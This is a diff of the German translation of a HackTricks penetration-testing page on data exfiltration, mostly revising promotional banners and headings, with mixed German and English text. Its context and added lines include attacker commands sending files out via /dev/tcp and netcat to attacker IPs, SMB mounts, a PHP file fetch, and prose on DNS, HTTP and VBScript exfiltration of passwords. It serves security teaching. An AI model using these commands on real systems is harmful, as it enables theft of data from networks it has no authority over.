@@ -1,18 +1,19 @@
 # Exfiltration
 
+{% hint style="success" %}
+Lernen Sie & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -22,9 +23,9 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 
 ***
 
-## Häufig weißgelistete Domains zur Informationsweiterleitung
+## Häufig whitelistete Domains zum Exfiltrieren von Informationen
 
-Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig weißgelistete Domains zu finden, die missbraucht werden können
+Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig whitelistete Domains zu finden, die missbraucht werden können
 
 ## Kopieren & Einfügen Base64
 
@@ -65,7 +66,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Dateien hochladen
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer, das GET- und POST-Anforderungen (auch Header) druckt**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -79,7 +80,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS-Server**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -185,17 +186,22 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
+Windows
+
+---
+
 ### Exfiltration
 
-Exfiltration techniques are used to steal data from a target network. Once an attacker gains access to a system, they need to find a way to get the data out without being detected. There are several methods to exfiltrate data, including:
+Exfiltration is the unauthorized transfer of data from a target. There are various methods to exfiltrate data from a compromised system. Some common exfiltration methods include:
 
-- **Compression**: Compressing data before exfiltration can help evade detection.
-- **Encryption**: Encrypting the data makes it harder for security tools to detect.
-- **Steganography**: Hiding data within other files or images can be a stealthy way to exfiltrate information.
-- **DNS Tunneling**: Using DNS requests to send data out of a network can bypass some security controls.
-- **Exfiltration over Alternative Protocols**: Using protocols like ICMP or HTTP to exfiltrate data can also help avoid detection.
+- **Email**: Sending data as email attachments to an external email account.
+- **FTP**: Transferring data using the File Transfer Protocol to an external server.
+- **DNS**: Encoding data within DNS requests to leak information.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
+- **Steganography**: Hiding data within other files to avoid detection.
+- **Cloud Storage**: Uploading data to cloud storage services.
 
-Attackers may also use tools like **PowerShell** or **WMI** for exfiltration, as these are built-in to Windows and may not be detected by security tools.
+Attackers may use one or more of these methods to exfiltrate sensitive information from a target network. It is essential for defenders to monitor and control outbound network traffic to detect and prevent exfiltration attempts.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -230,10 +236,6 @@ nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 ### Datei auf das Opfer hochladen
-
-Upload a file to the victim's machine. 
-
-Laden Sie eine Datei auf den Computer des Opfers hoch.
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -294,7 +296,9 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-Visual Basic Script (VBScript) ist eine von Microsoft entwickelte Skriptsprache, die in Windows-Umgebungen häufig verwendet wird. VBScript kann verwendet werden, um Windows-spezifische Aufgaben auszuführen und kann auch für bösartige Zwecke wie Datenexfiltration eingesetzt werden.
+### Exfiltration
+
+VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method, headers, and body, and then sending the request to the server. The server-side script should be able to receive the incoming data and log/process it as needed. This method can be used to exfiltrate sensitive information such as passwords, documents, or system configuration details.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -353,17 +357,18 @@ Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wi
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
 
 </details>
+{% endhint %}
 ```
